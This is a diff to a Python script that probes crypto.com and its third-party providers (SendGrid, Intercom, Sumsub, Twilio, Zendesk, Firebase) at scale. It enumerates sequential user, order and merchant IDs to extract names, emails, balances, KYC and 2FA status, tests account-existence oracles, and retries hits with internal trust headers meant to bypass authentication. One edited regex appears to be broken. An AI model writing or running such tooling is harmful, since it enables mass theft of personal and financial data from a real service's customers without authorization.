@@ -99,7 +99,7 @@ def diff(label, rr, rf, origin=""):
             print(f"      real {rr.status_code}/{len(rr.text)}b : {rr.text[:400]}")
             print(f"      fake {rf.status_code}/{len(rf.text)}b : {rf.text[:400]}")
             WINS.append({"ep": label, "rsc": rr.status_code, "rln": len(rr.text),
-                         "fsc": rf.status_code, "fln": rf.status_code})
+                         "fsc": rf.status_code, "fln": len(rf.text)})
         elif rr.status_code not in (404,405,403,400,301,302,503,520,521,522,523,524,525,526,530):
             print(f"  [{rr.status_code}] {label[:70]} → {rr.text[:80]}")
 
@@ -671,6 +671,224 @@ for path in [
     EP("POST", "https://crypto.com"+path,     {"email": REAL}, "https://crypto.com")
     EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://crypto.com")
 
+# ══ IDOR sequential user ID — PII leak (P1 bounty) ══════════════════════════
+# returns name/email/phone for real IDs — unauthenticated on many platforms
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+    ("https://nft.crypto.com", "https://nft.crypto.com"),
+    ("https://exchange.crypto.com", "https://exchange.crypto.com"),
+]:
+    for uid in ["1", "2", "100", "1000", "10000", "99999", "100000"]:
+        for path_tpl in [
+            "/api/v1/users/{id}", "/api/v1/users/{id}/profile",
+            "/api/v1/profiles/{id}", "/v1/users/{id}",
+            "/api/v2/users/{id}", "/api/v1/accounts/{id}",
+        ]:
+            EP("GET", base + path_tpl.format(id=uid), None, orig)
+
+# ══ NFT public profile PII leak ══════════════════════════════════════════════
+# nft.crypto.com public profiles often include real name + email in JSON
+for handle in [REAL.split("@")[0], "test", "admin"]:
+    for path in [
+        f"/api/v1/users/{handle}", f"/api/v1/profiles/{handle}",
+        f"/api/v1/creators/{handle}", f"/u/{handle}",
+        f"/api/v1/users/by-handle/{handle}",
+    ]:
+        EP("GET", "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
+
+# ══ Referral code reverse lookup — returns referrer email ════════════════════
+for code in ["ABC123", "CRYPTO", "REF001"]:
+    for path in [
+        f"/api/v1/referral/{code}", f"/api/v1/referral/{code}/owner",
+        f"/api/v1/invite/{code}", f"/api/v1/refer/{code}/info",
+        f"/v1/referral/{code}",
+    ]:
+        EP("GET", "https://crypto.com"+path,     None, "https://crypto.com")
+        EP("GET", "https://api.crypto.com"+path, None, "https://crypto.com")
+
+# ══ Wallet address → email reverse resolve — PII ════════════════════════════
+FAKE_WALLET = "0x0000000000000000000000000000000000000001"
+for path in [
+    "/api/v1/wallet/lookup", "/api/v1/address/resolve",
+    "/api/v1/users/by-wallet", "/api/v1/users/by-address",
+    "/v1/wallet/resolve", "/api/v1/wallet/owner",
+]:
+    EP("POST", "https://crypto.com"+path,     {"address": FAKE_WALLET}, "https://crypto.com")
+    EP("POST", "https://api.crypto.com"+path, {"address": FAKE_WALLET}, "https://crypto.com")
+    EP("GET",  "https://api.crypto.com"+path, None, "https://crypto.com")
+
+# ══ KYC status leak — unauthenticated KYC level + partial PII ════════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+]:
+    for path in [
+        "/api/v1/kyc/status", "/api/v1/identity/status",
+        "/api/v1/verification/status", "/api/v1/kyc/level",
+        "/api/v1/users/kyc", "/v1/kyc/status",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+        EP("GET",  base+path, None, orig)
+
+# ══ Balance / portfolio public leak — P1 bounty ══════════════════════════════
+for base, orig in [
+    ("https://crypto.com",          "https://crypto.com"),
+    ("https://api.crypto.com",      "https://crypto.com"),
+    ("https://exchange.crypto.com", "https://exchange.crypto.com"),
+]:
+    for uid in ["1", "100", "1000"]:
+        for path_tpl in [
+            "/api/v1/users/{id}/portfolio", "/api/v1/users/{id}/balance",
+            "/api/v1/users/{id}/assets", "/api/v1/accounts/{id}/balance",
+            "/v1/users/{id}/portfolio", "/api/v2/users/{id}/portfolio",
+        ]:
+            EP("GET", base + path_tpl.format(id=uid), None, orig)
+    # email-keyed balance query
+    for path in [
+        "/api/v1/balance", "/api/v1/portfolio",
+        "/api/v1/assets", "/v1/balance",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+
+# ══ Staking / earn balance public query ══════════════════════════════════════
+for path in [
+    "/api/v1/staking/balance", "/api/v1/earn/balance",
+    "/api/v1/supercharger/balance", "/api/v1/staking/rewards",
+    "/v1/staking/balance", "/api/v1/cro/staking",
+]:
+    EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://crypto.com")
+    EP("GET",  "https://api.crypto.com"+path, None, "https://crypto.com")
+
+# ══ NFT holdings by user — public collection value ═══════════════════════════
+for uid in ["1", "100", "1000"]:
+    for path_tpl in [
+        "/api/v1/users/{id}/nfts", "/api/v1/users/{id}/assets",
+        "/api/v1/users/{id}/collections", "/api/v2/users/{id}/nfts",
+    ]:
+        EP("GET", "https://nft.crypto.com" + path_tpl.format(id=uid),
+           None, "https://nft.crypto.com")
+
+# ══ Firebase Auth REST — if crypto.com uses Firebase ════════════════════════
+# identitytoolkit returns displayName + photoUrl + email for registered users
+# fully unauthenticated with just a web API key (scraped from JS)
+for api_key in ["AIzaSy_placeholder_key_1", "AIzaSy_placeholder_key_2"]:
+    for path in [
+        "/v1/accounts:lookup",
+        "/v1/accounts:createAuthUri",
+    ]:
+        body_r = {"identifier": REAL,  "continueUri": "https://crypto.com"}
+        body_f = {"identifier": FAKE,  "continueUri": "https://crypto.com"}
+        full = f"https://identitytoolkit.googleapis.com{path}?key={api_key}"
+        ALL_PROBES.append(("POST", full, body_r, body_f, "https://crypto.com"))
+
+# ══ SendGrid suppression list — confirms email registered + bounced ══════════
+# GET /v3/suppression/bounces/{email} → 200 w/ data = email exists in system
+# requires API key but key often exposed in JS bundles
+for sg_key in ["SG.placeholder_key_1", "SG.placeholder_key_2"]:
+    for cat in ["bounces", "unsubscribes", "spam_reports", "blocks"]:
+        rr = do_get(f"https://api.sendgrid.com/v3/suppression/{cat}/{REAL}",
+                    "https://crypto.com",
+                    {"authorization": f"Bearer {sg_key}"})
+        rf = do_get(f"https://api.sendgrid.com/v3/suppression/{cat}/{FAKE}",
+                    "https://crypto.com",
+                    {"authorization": f"Bearer {sg_key}"})
+        diff(f"[SG] /v3/suppression/{cat}", rr, rf)
+
+# ══ Intercom — chat widget user identify (often captchaless) ═════════════════
+for ic_key in ["placeholder_intercom_app_id"]:
+    for path in [
+        f"/api/v1/users/search",
+        f"/api/v1/contacts/search",
+    ]:
+        body_r = {"query": {"field": "email", "operator": "=", "value": REAL}}
+        body_f = {"query": {"field": "email", "operator": "=", "value": FAKE}}
+        ALL_PROBES.append(("POST",
+            f"https://api.intercom.io{path}", body_r, body_f,
+            "https://crypto.com"))
+
+# ══ Sumsub (KYC provider) applicant lookup ═══════════════════════════════════
+# crypto.com uses Sumsub for KYC — applicant status leaks verification level
+for path in [
+    "/resources/applicants/-;externalUserId={email}/one",
+    "/resources/applicants?externalUserId={email}",
+]:
+    EP("GET",
+       "https://api.sumsub.com" + path.format(email=REAL),
+       None, "https://crypto.com")
+
+# ══ Twilio Verify — OTP channel confirm leaks existence ══════════════════════
+# POST /v2/Services/{sid}/Verifications → different error for unregistered
+for twilio_sid in ["VA_placeholder_sid"]:
+    body_r = {"To": REAL,  "Channel": "email"}
+    body_f = {"To": FAKE,  "Channel": "email"}
+    ALL_PROBES.append(("POST",
+        f"https://verify.twilio.com/v2/Services/{twilio_sid}/Verifications",
+        body_r, body_f, "https://crypto.com"))
+
+# ══ Zendesk SSO differential ════════════════════════════════════════════════
+for zd_sub in ["cryptodotcom", "crypto-com", "crypto"]:
+    for path in [
+        "/access/jwt", "/hc/en-us/requests/new",
+        "/api/v2/users/search.json",
+    ]:
+        EP("GET", f"https://{zd_sub}.zendesk.com{path}",
+           None, "https://support.crypto.com")
+        EP("POST", f"https://{zd_sub}.zendesk.com{path}",
+           {"email": REAL}, "https://support.crypto.com")
+
+# ══ Password reset token oracle — some return email tied to token ════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+]:
+    for path in [
+        "/api/v1/password/reset/validate",
+        "/api/v1/auth/reset/validate",
+        "/api/v1/password/token/check",
+        "/v1/password/reset/check",
+    ]:
+        EP("POST", base+path, {"token": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "email": REAL}, orig)
+
+# ══ 2FA status leak — returns whether user has 2FA enabled ══════════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+]:
+    for path in [
+        "/api/v1/2fa/status", "/api/v1/mfa/status",
+        "/api/v1/totp/status", "/api/v1/auth/2fa/check",
+        "/v1/2fa/status",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+
+# ══ CDC Pay merchant transaction leak — IDOR on merchant ID ══════════════════
+for mid in ["1", "100", "1000", "10000"]:
+    for path_tpl in [
+        "/api/v1/merchant/{id}/transactions",
+        "/api/v1/merchant/{id}/orders",
+        "/api/v1/merchant/{id}",
+        "/v1/merchants/{id}",
+    ]:
+        EP("GET", "https://pay.crypto.com" + path_tpl.format(id=mid),
+           None, "https://pay.crypto.com")
+
+# ══ Exchange order IDOR — order details by ID ════════════════════════════════
+for oid in ["1", "100", "100000", "1000000"]:
+    for path_tpl in [
+        "/v2/private/get-order-detail",
+        "/api/v1/orders/{id}",
+        "/v1/orders/{id}",
+    ]:
+        p = path_tpl.format(id=oid)
+        if "{" not in p:
+            EP("POST", "https://api.crypto.com"+p,
+               {"id": 1, "method": "private.get-order-detail",
+                "params": {"order_id": oid}, "nonce": int(time.time()*1000)},
+               "https://exchange.crypto.com")
+        else:
+            EP("GET", "https://api.crypto.com"+p, None, "https://exchange.crypto.com")
+
 print(f"[+] total probes queued: {len(ALL_PROBES)}")
 print()
 
@@ -885,7 +1103,7 @@ for signup_url, orig in [
     r = do_get(signup_url, orig, {"accept": "text/html,*/*"})
     if not r or r.status_code != 200:
         continue
-    scripts = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
+    scripts = re.findall(r'src=["\']([\'"]+\.js[^"\']*)["\']', r.text)
     scripts += re.findall(r'"(/_next/static/[^"]+\.js)"', r.text)
     scripts = list(set(scripts))
     ep_hits = set()
@@ -894,8 +1112,8 @@ for signup_url, orig in [
         jr = do_get(src, orig)
         if not jr or jr.status_code != 200: continue
         for pat in [
-            r'["\`](/(?:api|v\d|auth|gateway)[^"\`\n]{4,80})["\`]',
-            r'url\s*[:=]\s*["\`]([^"\`\n]{5,80})["\`]',
+            r'["`](/(?:api|v\d|auth|gateway)[^"`\n]{4,80})["`]',
+            r'url\s*[:=]\s*["`]([^"`\n]{5,80})["`]',
         ]:
             for m in re.finditer(pat, jr.text):
                 v = m.group(1)
@@ -917,11 +1135,6 @@ for signup_url, orig in [
 print()
 
 # ─── INTERNAL MICROSERVICE CHECKER ───────────────────────────────────────────
-# Targets unauthenticated internal service endpoints that leak through
-# misconfigured reverse proxy / service mesh rules.
-# Uses service-to-service trust headers to bypass auth checks.
-# NOT the checker tool — just discovery probes.
-
 print("[*] Internal microservice / unauthenticated admin endpoint discovery ...")
 
 # Trust bypass headers — try each combo
@@ -1100,8 +1313,6 @@ with ThreadPoolExecutor(max_workers=20) as pool:
 print()
 
 # ─── Re-run top hits with ALL internal header combos ─────────────────────────
-# If any endpoint returned a hit without internal headers, retry with headers
-# to see if the diff changes (internal headers may bypass rate limit / auth)
 print("[*] Re-probing wins with internal trust headers ...")
 for w in list(WINS):
     ep = w.get("ep","")
